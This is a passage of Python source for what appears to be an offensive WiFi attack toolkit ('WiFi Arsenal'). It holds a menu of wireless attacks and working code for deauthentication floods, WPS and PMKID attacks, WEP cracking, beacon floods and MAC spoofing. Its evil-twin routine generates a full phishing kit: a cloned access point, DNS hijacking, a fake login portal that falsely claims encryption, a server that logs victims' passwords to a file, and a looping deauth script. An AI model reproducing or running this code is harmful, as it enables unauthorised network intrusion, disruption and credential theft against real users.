            print("7.  PMKID Attack")
            print("8.  Evil Twin Attack")
            print("9.  Deauthentication Attack")
            print("10. WEP Cracking Attack")
            print("11. Beacon Flood Attack")
            print("12. MAC Address Spoofing")
            print("13. Rogue Access Point")
            print("14. Karma Attack")
            print("15. Krack Attack (WPA2)")
            
            print(f"\n{Fore.BLUE}🛠️  Utilities:{Style.RESET_ALL}")
            print("16. Smart Wordlist Generation")
            print("17. View Results & Reports")
            print("18. System Information")
            print("19. Network Mapper")
            print("20. Client Monitoring")
            
            print(f"\n{Fore.MAGENTA}🎭 Advanced Attacks:{Style.RESET_ALL}")
            print("21. DNS Hijacking Attack")
            print("22. Packet Injection Suite")
            print("23. WiFi Jammer")
            print("24. Bluetooth Scanner & Attack")
            print("25. Captive Portal Generator")
            
            print(f"\n{Fore.RED}0.  Exit{Style.RESET_ALL}")
            print("="*80)
            
            try:
                choice = input(f"\n{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
                
                if choice == '1':
                    self.interface_setup_menu()
                elif choice == '2':
                    self.check_dependencies()
                elif choice == '3':
                    self.network_discovery_menu()
                elif choice == '4':
                    self.handshake_capture_menu()
                elif choice == '5':
                    self.password_cracking_menu()
                elif choice == '6':
                    self.wps_attack_menu()
                elif choice == '7':
                    self.pmkid_attack_menu()
                elif choice == '8':
                    self.evil_twin_menu()
                elif choice == '9':
                    self.deauth_attack_menu()
                elif choice == '10':
                    self.wep_cracking_menu()
                elif choice == '11':
                    self.beacon_flood_menu()
                elif choice == '12':
                    self.mac_spoofing_menu()
                elif choice == '13':
                    self.rogue_ap_menu()
                elif choice == '14':
                    self.karma_attack_menu()
                elif choice == '15':
                    self.krack_attack_menu()
                elif choice == '16':
                    self.wordlist_generation_menu()
                elif choice == '17':
                    self.view_results_menu()
                elif choice == '18':
                    self.system_info_menu()
                elif choice == '19':
                    self.network_mapper_menu()
                elif choice == '20':
                    self.client_monitoring_menu()
                elif choice == '21':
                    self.dns_hijacking_menu()
                elif choice == '22':
                    self.packet_injection_menu()
                elif choice == '23':
                    self.wifi_jammer_menu()
                elif choice == '24':
                    self.bluetooth_scanner_menu()
                elif choice == '25':
                    self.captive_portal_generator_menu()
                elif choice == '0':
                    self.cleanup_and_exit()
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                self.cleanup_and_exit()
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    def interface_setup_menu(self):
        """Interface setup menu"""
        interfaces = self.get_wireless_interfaces()
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] Available wireless interfaces:{Style.RESET_ALL}")
        for i, iface in enumerate(interfaces):
            print(f"  {i+1}. {iface}")
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select interface: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(interfaces):
                self.interface = interfaces[choice]
                if self.setup_monitor_mode(self.interface):
                    print(f"{Fore.GREEN}[+] Interface {self.interface} configured successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Failed to setup monitor mode{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def network_discovery_menu(self):
        """Network discovery menu"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Please setup monitor mode first{Style.RESET_ALL}")
            return
        
        try:
            duration = int(input(f"{Fore.CYAN}[?] Scan duration in seconds (default 60): {Style.RESET_ALL}") or "60")
            
            networks = self.scan_networks(duration)
            if networks:
                self.target_networks = networks
                self.display_networks(networks)
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                scan_file = f"{self.results_dir}/scans/scan_{timestamp}.json"
                with open(scan_file, 'w') as f:
                    json.dump(networks, f, indent=2)
                print(f"\n{Fore.GREEN}[+] Scan results saved to {scan_file}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] No networks found{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def handshake_capture_menu(self):
        """Handshake capture menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target network: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                
                print(f"{Fore.YELLOW}[*] Starting handshake capture...{Style.RESET_ALL}")
                
                capture = HandshakeCapturer(self.monitor_interface)
                cap_file = capture.capture_handshake(
                    target['bssid'],
                    target['channel'], 
                    target['essid']
                )
                
                if cap_file and os.path.exists(cap_file):
                    final_path = os.path.join(self.results_dir, 'handshakes', os.path.basename(cap_file))
                    shutil.move(cap_file, final_path)
                    self.captured_handshakes.append(final_path)
                    print(f"{Fore.GREEN}[+] Handshake saved to {final_path}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Handshake capture failed{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def password_cracking_menu(self):
        """Password cracking menu"""
        if not self.captured_handshakes:
            handshake_dir = f"{self.results_dir}/handshakes"
            if os.path.exists(handshake_dir):
                handshakes = [f for f in os.listdir(handshake_dir) if f.endswith('.cap')]
                if handshakes:
                    self.captured_handshakes = [os.path.join(handshake_dir, h) for h in handshakes]
        
        if not self.captured_handshakes:
            print(f"{Fore.RED}[!] No captured handshakes available{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] Available handshakes:{Style.RESET_ALL}")
        for i, cap_file in enumerate(self.captured_handshakes):
            print(f"  {i+1}. {os.path.basename(cap_file)}")
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select handshake: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.captured_handshakes):
                cap_file = self.captured_handshakes[choice]
                
                use_custom = input(f"{Fore.CYAN}[?] Use custom wordlist? (y/N): {Style.RESET_ALL}").lower() == 'y'
                wordlist_file = None
                
                if use_custom:
                    wordlist_file = input(f"{Fore.CYAN}[?] Wordlist file path: {Style.RESET_ALL}").strip()
                    if not os.path.exists(wordlist_file):
                        print(f"{Fore.RED}[!] Wordlist file not found{Style.RESET_ALL}")
                        return
                
                use_gpu = input(f"{Fore.CYAN}[?] Use GPU acceleration (if available)? (y/N): {Style.RESET_ALL}").lower() == 'y'
                
                print(f"{Fore.YELLOW}[*] Starting password cracking...{Style.RESET_ALL}")
                
                cracker = PasswordCracker()
                password = cracker.crack_handshake(cap_file, wordlist_file, use_gpu)
                
                if password:
                    print(f"{Fore.GREEN}[+] SUCCESS! Password found: {password}{Style.RESET_ALL}")
                    result_file = f"{self.results_dir}/results.txt"
                    with open(result_file, 'a') as f:
                        f.write(f"{datetime.now()}: {cap_file} -> {password}\n")
                else:
                    print(f"{Fore.RED}[-] Password not found{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def wordlist_generation_menu(self):
        """Wordlist generation menu"""
        try:
            size = int(input(f"{Fore.CYAN}[?] Wordlist size (default 50000): {Style.RESET_ALL}") or "50000")
            
            cracker = PasswordCracker()
            wordlist_file = cracker.generate_smart_wordlist(size)
            
            print(f"{Fore.GREEN}[+] Wordlist generated: {wordlist_file}{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def view_results_menu(self):
        """View results menu"""
        print(f"\n{Fore.CYAN}[*] WiFi Arsenal Results Summary{Style.RESET_ALL}")
        print("-" * 60)
        
        subdirs = ['handshakes', 'wordlists', 'logs', 'scans', 'attacks']
        
        for subdir in subdirs:
            path = os.path.join(self.results_dir, subdir)
            if os.path.exists(path):
                files = os.listdir(path)
                print(f"{Fore.GREEN}{subdir.title()}:{Style.RESET_ALL} {len(files)} files")
                
                if files:
                    for f in sorted(files)[-3:]:
                        file_path = os.path.join(path, f)
                        try:
                            size = os.path.getsize(file_path)
                            print(f"  - {f} ({size} bytes)")
                        except:
                            print(f"  - {f}")

    def system_info_menu(self):
        """System information menu"""
        print(f"\n{Fore.CYAN}[*] System Information{Style.RESET_ALL}")
        print("-" * 50)
        
        print(f"WiFi Arsenal Version: {self.version}")
        print(f"Python Version: {sys.version.split()[0]}")
        
        interfaces = self.get_wireless_interfaces()
        print(f"Wireless Interfaces: {', '.join(interfaces) if interfaces else 'None'}")
        
        if self.interface:
            print(f"Active Interface: {self.interface}")
        if self.monitor_interface:
            print(f"Monitor Interface: {self.monitor_interface}")
        
        print(f"\n{Fore.CYAN}[*] Capabilities:{Style.RESET_ALL}")
        capabilities = {
            'Root Access': os.geteuid() == 0,
            'Monitor Mode': bool(self.monitor_interface),
            'Aircrack-ng Suite': self.command_exists('aircrack-ng'),
            'Hashcat GPU': self.command_exists('hashcat'),
            'John the Ripper': self.command_exists('john')
        }
        
        for cap, status in capabilities.items():
            status_color = Fore.GREEN if status else Fore.RED
            status_text = "✓" if status else "✗"
            print(f"  {status_color}{status_text}{Style.RESET_ALL} {cap}")

    def wps_attack_menu(self):
        """WPS attack menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        wps_networks = []
        for network in self.target_networks:
            if 'WPS' in network.get('privacy', '') or self.check_wps_enabled(network['bssid']):
                wps_networks.append(network)
        
        if not wps_networks:
            print(f"{Fore.RED}[!] No WPS-enabled networks found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] WPS-enabled networks:{Style.RESET_ALL}")
        for i, network in enumerate(wps_networks):
            print(f"  {i+1}. {network['essid']} ({network['bssid']})")
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(wps_networks):
                target = wps_networks[choice]
                
                print(f"{Fore.YELLOW}[*] Launching WPS attack on {target['essid']}...{Style.RESET_ALL}")
                
                if self.command_exists('reaver'):
                    subprocess.run([
                        'reaver', '-i', self.monitor_interface,
                        '-b', target['bssid'], '-c', target['channel'],
                        '-vv', '-K', '1'
                    ], timeout=300)
                else:
                    print(f"{Fore.RED}[!] Reaver not installed{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def pmkid_attack_menu(self):
        """PMKID attack menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target for PMKID attack: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                
                print(f"{Fore.YELLOW}[*] Attempting PMKID attack on {target['essid']}...{Style.RESET_ALL}")
                
                if self.command_exists('hcxdumptool'):
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_file = f"{self.results_dir}/attacks/pmkid_{timestamp}.pcapng"
                    
                    subprocess.run([
                        'hcxdumptool', '-i', self.monitor_interface,
                        '--enable_status=1', '--disable_deauthentication',
                        '--filterlist_ap=' + target['bssid'],
                        '-o', output_file
                    ], timeout=120)
                    
                    hash_file = output_file.replace('.pcapng', '.hash')
                    if self.command_exists('hcxpcapngtool'):
                        subprocess.run([
                            'hcxpcapngtool', '-o', hash_file, output_file
                        ])
                        
                        if os.path.exists(hash_file):
                            print(f"{Fore.GREEN}[+] PMKID hash saved to {hash_file}{Style.RESET_ALL}")
                        
                else:
                    print(f"{Fore.RED}[!] hcxdumptool not installed{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def evil_twin_menu(self):
        """Evil twin attack menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target to clone: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                
                print(f"{Fore.YELLOW}[*] Setting up evil twin for {target['essid']}...{Style.RESET_ALL}")
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                self.setup_evil_twin_infrastructure(target, timestamp)
                
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def setup_evil_twin_infrastructure(self, target, timestamp):
        """Setup evil twin infrastructure"""
        attack_dir = f"{self.results_dir}/attacks/evil_twin_{timestamp}"
        os.makedirs(attack_dir, exist_ok=True)
        
        # Hostapd configuration
        hostapd_config = f"""interface={self.monitor_interface}
driver=nl80211
ssid={target['essid']}
hw_mode=g
channel={target['channel']}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

wpa=2
wpa_passphrase=wifi_arsenal_2024
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

wpa_group_rekey=86400
ieee80211n=1
wmm_enabled=1
"""
        
        hostapd_file = f"{attack_dir}/hostapd.conf"
        with open(hostapd_file, 'w') as f:
            f.write(hostapd_config)
        
        # DNSMASQ configuration
        dnsmasq_config = f"""interface={self.monitor_interface}
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
"""
        
        dnsmasq_file = f"{attack_dir}/dnsmasq.conf"
        with open(dnsmasq_file, 'w') as f:
            f.write(dnsmasq_config)
        
        # Captive portal HTML
        captive_portal_html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authentication - {target['essid']}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .wifi-icon {{
            font-size: 48px;
            color: #667eea;
        }}
        h1 {{
            text-align: center;
            color: #333;
            margin-bottom: 10px;
        }}
        .network-name {{
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 18px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: bold;
        }}
        input[type="text"], input[type="password"] {{
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }}
        input[type="text"]:focus, input[type="password"]:focus {{
            outline: none;
            border-color: #667eea;
        }}
        .btn {{
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }}
        .btn:hover {{
            background: #5a67d8;
        }}
        .security-notice {{
            margin-top: 20px;
            padding: 15px;
            background: #f7fafc;
            border-left: 4px solid #667eea;
            font-size: 14px;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="wifi-icon">📶</div>
        </div>
        <h1>WiFi Authentication Required</h1>
        <div class="network-name">Network: {target['essid']}</div>
        
        <form method="post" action="/authenticate">
            <div class="form-group">
                <label for="username">Username/Email:</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">WiFi Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="btn">Connect to WiFi</button>
        </form>
        
        <div class="security-notice">
            🔒 This is a secure connection. Your credentials are protected by enterprise-grade encryption.
        </div>
    </div>
</body>
</html>"""
        
        portal_file = f"{attack_dir}/captive_portal.html"
        with open(portal_file, 'w') as f:
            f.write(captive_portal_html)
        
        # HTTP server for captive portal
        server_script = f"""#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
from datetime import datetime
import os

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path.startswith('/generate_204') or self.path.startswith('/hotspot-detect'):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            with open('captive_portal.html', 'r') as f:
                content = f.read()
            self.wfile.write(content.encode())
        else:
            self.send_response(302)
            self.send_header('Location', 'http://192.168.1.1/')
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/authenticate':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)
            
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            log_entry = f"{{datetime.now()}} - Captured credentials: Username={{username}}, Password={{password}}\\n"
            
            with open('captured_credentials.txt', 'a') as f:
                f.write(log_entry)
            
            print(f"[+] Captured credentials: {{username}} / {{password}}")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            success_html = '''
            <html><body>
            <h2>Authentication Successful!</h2>
            <p>You are now connected to the internet.</p>
            <script>setTimeout(function(){{window.location.href="http://google.com";}}, 3000);</script>
            </body></html>
            '''
            self.wfile.write(success_html.encode())

if __name__ == "__main__":
    PORT = 80
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    with socketserver.TCPServer(("", PORT), CaptivePortalHandler) as httpd:
        print(f"Captive portal server started at port {{PORT}}")
        httpd.serve_forever()
"""
        
        server_file = f"{attack_dir}/captive_server.py"
        with open(server_file, 'w') as f:
            f.write(server_script)
        os.chmod(server_file, 0o755)
        
        # Startup script
        startup_script = f"""#!/bin/bash
echo "[*] Starting Evil Twin Attack for {target['essid']}"
echo "[*] Target BSSID: {target['bssid']}"
echo "[*] Target Channel: {target['channel']}"
echo ""

cd "{attack_dir}"

echo "[*] Setting up network interface..."
ifconfig {self.monitor_interface} 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Starting DHCP/DNS server..."
dnsmasq -C dnsmasq.conf --no-daemon &
DNSMASQ_PID=$!

echo "[*] Starting captive portal server..."
python3 captive_server.py &
PORTAL_PID=$!

echo "[*] Starting evil twin access point..."
echo "[+] Clients will see network: {target['essid']}"
echo "[+] Credentials will be logged to: captured_credentials.txt"
echo "[+] Press Ctrl+C to stop attack"
echo ""

cleanup() {{
    echo ""
    echo "[*] Stopping evil twin attack..."
    kill $DNSMASQ_PID 2>/dev/null
    kill $PORTAL_PID 2>/dev/null
    pkill hostapd 2>/dev/null
    echo "[+] Attack stopped"
    exit 0
}}

trap cleanup SIGINT

hostapd hostapd.conf

cleanup
"""
        
        startup_file = f"{attack_dir}/start_evil_twin.sh"
        with open(startup_file, 'w') as f:
            f.write(startup_script)
        os.chmod(startup_file, 0o755)
        
        # Iptables rules
        iptables_script = f"""#!/bin/bash
iptables -F
iptables -t nat -F

iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

iptables -A INPUT -i {self.monitor_interface} -j ACCEPT
iptables -A OUTPUT -o {self.monitor_interface} -j ACCEPT

iptables -t nat -A PREROUTING -i {self.monitor_interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
iptables -t nat -A PREROUTING -i {self.monitor_interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80

iptables -A INPUT -i {self.monitor_interface} -p udp --dport 53 -j ACCEPT

echo "[+] Iptables rules configured for evil twin attack"
"""
        
        iptables_file = f"{attack_dir}/setup_iptables.sh"
        with open(iptables_file, 'w') as f:
            f.write(iptables_script)
        os.chmod(iptables_file, 0o755)
        
        # Deauth script
        deauth_script = f"""#!/bin/bash
echo "[*] Starting deauthentication attack on {target['essid']} ({target['bssid']})"
echo "[*] This will disconnect clients from the original AP"
echo "[*] Press Ctrl+C to stop"

while true; do
    aireplay-ng --deauth 5 -a {target['bssid']} {self.monitor_interface} 2>/dev/null
    sleep 3
done
"""
        
        deauth_file = f"{attack_dir}/deauth_original.sh"
        with open(deauth_file, 'w') as f:
            f.write(deauth_script)
        os.chmod(deauth_file, 0o755)
        
        print(f"{Fore.GREEN}[+] Evil twin infrastructure created in: {attack_dir}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Components created:{Style.RESET_ALL}")
        print(f"    - hostapd.conf (Access Point configuration)")
        print(f"    - dnsmasq.conf (DHCP/DNS server)")
        print(f"    - captive_portal.html (Credential harvesting page)")
        print(f"    - captive_server.py (HTTP server)")
        print(f"    - start_evil_twin.sh (Main startup script)")
        print(f"    - setup_iptables.sh (Network rules)")
        print(f"    - deauth_original.sh (Deauth original AP)")
        
        print(f"\n{Fore.YELLOW}[*] To start the evil twin attack:{Style.RESET_ALL}")
        print(f"1. Run: sudo bash {startup_file}")
        print(f"2. In another terminal, run: sudo bash {deauth_file}")
        print(f"3. Monitor captured credentials in: {attack_dir}/captured_credentials.txt")
        
        start_now = input(f"\n{Fore.CYAN}[?] Start evil twin attack now? (y/N): {Style.RESET_ALL}").lower() == 'y'
        if start_now:
            print(f"{Fore.YELLOW}[*] Starting evil twin attack...{Style.RESET_ALL}")
            try:
                os.chdir(attack_dir)
                subprocess.run(['bash', 'start_evil_twin.sh'])
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Evil twin attack stopped{Style.RESET_ALL}")

    def deauth_attack_menu(self):
        """Deauthentication attack menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        self.display_networks(self.target_networks)
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select target for deauth attack: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(self.target_networks):
                target = self.target_networks[choice]
                
                count = int(input(f"{Fore.CYAN}[?] Number of deauth packets (default 10): {Style.RESET_ALL}") or "10")
                
                print(f"{Fore.YELLOW}[*] Sending {count} deauth packets to {target['essid']}...{Style.RESET_ALL}")
                
                if self.command_exists('aireplay-ng'):
                    subprocess.run([
                        'aireplay-ng', '--deauth', str(count),
                        '-a', target['bssid'],
                        self.monitor_interface
                    ])
                else:
                    broadcast = "ff:ff:ff:ff:ff:ff"
                    for i in range(count):
                        deauth = RadioTap() / Dot11(addr1=broadcast, addr2=target['bssid'], addr3=target['bssid']) / Dot11Deauth(reason=7)
                        sendp(deauth, iface=self.monitor_interface, verbose=False)
                        time.sleep(0.1)
                
                print(f"{Fore.GREEN}[+] Deauth attack completed{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")

    def check_wps_enabled(self, bssid):
        """Check if WPS is enabled"""
        if self.command_exists('wash'):
            try:
                result = subprocess.run([
                    'wash', '-i', self.monitor_interface
                ], capture_output=True, text=True, timeout=10)
                
                return bssid in result.stdout
            except:
                return False
        return False

    def wep_cracking_menu(self):
        """WEP cracking menu"""
        if not self.target_networks:
            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
            return
        
        wep_networks = [n for n in self.target_networks if 'WEP' in n.get('privacy', '')]
        
        if not wep_networks:
            print(f"{Fore.RED}[!] No WEP networks found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] WEP networks:{Style.RESET_ALL}")
        for i, network in enumerate(wep_networks):
            print(f"  {i+1}. {network['essid']} ({network['bssid']})")
        
        try:
            choice = int(input(f"\n{Fore.CYAN}[?] Select WEP target: {Style.RESET_ALL}")) - 1
            if 0 <= choice < len(wep_networks):
                target = wep_networks[choice]
                print(f"{Fore.YELLOW}[*] Starting WEP attack on {target['essid']}...{Style.RESET_ALL}")
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = f"{self.results_dir}/attacks/wep_{timestamp}"
                
                if self.command_exists('airodump-ng'):
                    airodump_cmd = [
                        'airodump-ng', self.monitor_interface,
                        '--bssid', target['bssid'],
                        '--channel', target['channel'],
                        '--write', output_file
                    ]
                    
                    print(f"[*] Starting packet capture...")
                    process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    if self.command_exists('aireplay-ng'):
                        time.sleep(5)
                        print(f"[*] Starting fake authentication...")
                        subprocess.run([
                            'aireplay-ng', '--fakeauth', '0',
                            '-a', target['bssid'],
                            self.monitor_interface
                        ], timeout=30, capture_output=True)
                        
                        print(f"[*] Starting ARP replay attack...")
                        subprocess.run([
                            'aireplay-ng', '--arpreplay',
                            '-b', target['bssid'],
                            self.monitor_interface
                        ], timeout=300, capture_output=True)
                    
                    time.sleep(30)
                    process.terminate()
                    
                    if self.command_exists('aircrack-ng'):
                        print(f"[*] Attempting to crack WEP key...")
                        result = subprocess.run([
                            'aircrack-ng', f"{output_file}-01.cap"
                        ], capture_output=True, text=True)
                        
                        if "KEY FOUND!" in result.stdout:
                            print(f"{Fore.GREEN}[+] WEP key cracked!{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.YELLOW}[*] Need more IVs for cracking{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def beacon_flood_menu(self):
        """Beacon flood menu"""
        try:
            ssid_count = int(input(f"{Fore.CYAN}[?] Number of fake SSIDs to broadcast (default 50): {Style.RESET_ALL}") or "50")
            duration = int(input(f"{Fore.CYAN}[?] Attack duration in seconds (default 60): {Style.RESET_ALL}") or "60")
            
            print(f"{Fore.YELLOW}[*] Starting beacon flood attack...{Style.RESET_ALL}")
            
            fake_ssids = []
            for i in range(ssid_count):
                ssid_types = [
                    f"Free_WiFi_{i:03d}",
                    f"Guest_Network_{i:03d}",
                    f"Hotel_WiFi_{i:03d}",
                    f"Coffee_Shop_{i:03d}",
                    f"Public_Internet_{i:03d}",
                    "".join(random.choices(string.ascii_letters + string.digits, k=8))
                ]
                fake_ssids.append(random.choice(ssid_types))
            
            try:
                for duration_left in range(duration, 0, -1):
                    for ssid in fake_ssids[:10]:
                        mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
                        
                        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
                        beacon = Dot11Beacon(cap="ESS+privacy")
                        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                        
                        frame = RadioTap()/dot11/beacon/essid
                        sendp(frame, iface=self.monitor_interface, verbose=False)
                    
                    if duration_left % 10 == 0:
                        print(f"[*] {duration_left} seconds remaining...")
                    time.sleep(1)
                
                print(f"{Fore.GREEN}[+] Beacon flood attack completed{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}[!] Beacon flood failed: {e}{Style.RESET_ALL}")
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def mac_spoofing_menu(self):
        """MAC spoofing menu"""
        if not self.interface:
            print(f"{Fore.RED}[!] No interface selected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}[*] MAC Address Spoofing Options:{Style.RESET_ALL}")
        print("1. Random MAC address")
        print("2. Specific vendor MAC")
        print("3. Clone target MAC")
        print("4. Restore original MAC")
        
        try:
            choice = input(f"\n{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                new_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
                self.change_mac_address(new_mac)
            
            elif choice == '2':
                vendors = {
                    'apple': '00:1B:63',
                    'samsung': '00:07:AB', 
                    'intel': '00:1F:3C',
                    'cisco': '00:0C:29',
                    'netgear': '00:14:6C'
                }
                
                print(f"\n{Fore.CYAN}[*] Available vendors:{Style.RESET_ALL}")
                for vendor in vendors:
                    print(f"  - {vendor}")
                
                vendor = input(f"\n{Fore.CYAN}[?] Select vendor: {Style.RESET_ALL}").lower()
                if vendor in vendors:
                    suffix = ":".join([f"{random.randint(0,255):02x}" for _ in range(3)])
                    new_mac = f"{vendors[vendor]}:{suffix}"
                    self.change_mac_address(new_mac)
            
            elif choice == '3':
                if self.target_networks:
                    self.display_networks(self.target_networks)
                    target_choice = int(input(f"\n{Fore.CYAN}[?] Select target to clone MAC: {Style.RESET_ALL}")) - 1
                    if 0 <= target_choice < len(self.target_networks):
                        target_mac = self.target_networks[target_choice]['bssid']
                        self.change_mac_address(target_mac)
                else:
                    print(f"{Fore.RED}[!] No targets available{Style.RESET_ALL}")
            
            elif choice == '4':
                self.restore_mac_address()
        
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
    
    def change_mac_address(self, new_mac):
        """Change MAC address"""
        try:
            print(f"{Fore.YELLOW}[*] Changing MAC address to {new_mac}...{Style.RESET_ALL}")
            
            if self.command_exists('macchanger'):
                subprocess.run(['macchanger', '-m', new_mac, self.interface], 
                              capture_output=True, timeout=10)
            else:
                subprocess.run(['ifconfig', self.interface, 'down'], timeout=10)
                subprocess.run(['ifconfig', self.interface, 'hw', 'ether', new_mac], timeout=10)
                subprocess.run(['ifconfig', self.interface, 'up'], timeout=10)
